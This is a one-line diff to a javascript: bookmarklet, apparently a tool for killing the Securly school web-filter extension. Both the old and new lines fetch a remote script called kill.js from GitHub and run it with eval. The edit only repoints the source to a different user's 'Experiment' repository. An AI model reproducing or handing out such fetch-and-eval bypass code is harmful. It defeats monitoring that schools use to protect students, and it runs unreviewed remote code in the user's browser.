@@ -1,1 +1,1 @@
-javascript:fetch("https://raw.githubusercontent.com/zek-c/Securly-Kill-V111/main/kill.js").then(r => r.text()).then(r => eval(r))
+javascript:fetch("https://raw.githubusercontent.com/Jamzwee479/Experiment/blob/main/kill.js").then(r => r.text()).then(r => eval(r))
